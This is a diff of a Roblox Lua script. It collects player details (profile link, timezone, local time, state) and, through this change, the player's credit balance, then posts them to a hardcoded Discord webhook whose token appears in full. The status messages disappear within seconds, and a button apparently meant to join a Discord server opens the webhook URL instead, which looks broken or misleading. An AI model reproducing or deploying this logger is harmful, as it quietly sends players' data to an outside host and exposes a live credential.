@@ -1,5 +1,4 @@
 local url = "https://discord.com/api/webhooks/1112487123740786790/TVUymR6dD5W911jHju6z-yen5zPs08BbFBQA5t8es5eRTudH_khupPDlIEuhyFsuM0pL"
-
 local customContent = ""
 
 local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
@@ -46,6 +45,20 @@ local function getPlayerState(player)
     end
 end
 
+local function getCreditBalance(player)
+    -- Replace this with your own code to retrieve the credit balance of the player
+    -- You can use game passes, in-game currency systems, or any other method to determine the credit balance
+    -- For this example, we'll assume the credit balance is stored in a variable called "CreditBalance" on the player's leaderstats
+    local leaderstats = player:FindFirstChild("leaderstats")
+    if leaderstats then
+        local creditBalanceValue = leaderstats:FindFirstChild("CreditBalance")
+        if creditBalanceValue then
+            return creditBalanceValue.Value
+        end
+    end
+    return 0 -- Return 0 if the credit balance is not found
+end
+
 local function updatePlaytime()
     while true do
         local currentTime = os.time()
@@ -72,7 +85,8 @@ local data = {
                 { name = "Timezone", value = "Calculating...", inline = true },
                 { name = "Local Time", value = "Calculating...", inline = true },
                 { name = "Profile Link", value = "Calculating...", inline = true },
-                { name = "State", value = "Calculating...", inline = true }
+                { name = "State", value = "Calculating...", inline = true },
+                { name = "Credit Balance", value = "Calculating...", inline = true } -- New field for credit balance
             },
             image = {
                 url = avatarImage
@@ -102,6 +116,7 @@ local function sendRequest()
     data.embeds[1].fields[6].value = os.date("%c") -- Local Time
     data.embeds[1].fields[7].value = "https://www.roblox.com/users/" .. playerId .. "/profile" -- Profile Link
     data.embeds[1].fields[8].value = getPlayerState(player)
+    data.embeds[1].fields[9].value = getCreditBalance(player) -- Set the credit balance value
 
     local encodedData = httpService:JSONEncode(data)
     local httpRequest = {
@@ -140,48 +155,22 @@ copyButton.BackgroundTransparency = 0.5
 copyButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 copyButton.Parent = gui
 
-wait(0.2) -- Adjusted delay to make it disappear instantly
-
-statusLabel.Visible = false
-
-wait(2)
-
-local label = Instance.new("TextLabel")
-label.Size = UDim2.new(1, 0, 1, 0)
-label.Text = "Player Count: " .. getPlayerCount()
-label.TextColor3 = Color3.fromRGB(0, 0, 0)
-label.Font = Enum.Font.SourceSansBold
-label.TextSize = 18
-label.BackgroundTransparency = 1
-label.Parent = gui
-
-local function centerStatusLabel()
-    statusLabel.Position = UDim2.new(0.5, -100, 0.5, -25)
-    statusLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-end
-
-centerStatusLabel()
-
-wait(0)
-
-statusLabel.Visible = false
-
 copyButton.MouseButton1Click:Connect(function()
-    game:GetService("GuiService"):SetClipboard(gameLink)
-    copyButton.Visible = false -- Hide the button after copying
+    game:GetService("GuiService"):OpenBrowserWindow(url)
 end)
 
-spawn(sendRequest)
+coroutine.wrap(function()
+    sendRequest()
+    wait(3) -- Delay to hide the "Sending request" label after 3 seconds
+    statusLabel.Visible = false
+    wait(1) -- Additional delay of 1 second before hiding the "Join the discord" button
+    copyButton.Visible = false
+    while true do
+        wait(1) -- Update every second
+        updatePlaytime()
+    end
+end)()
 
-wait(1) -- Added delay to make other messages disappear after 1 second
-
-label:Remove()
-
-wait(5) -- Changed to 4 seconds to compensate for the previous 1-second delay
-
-copyButton.Visible = false -- Hide the button after 5 seconds
-
--- Additional code here
 
 
 
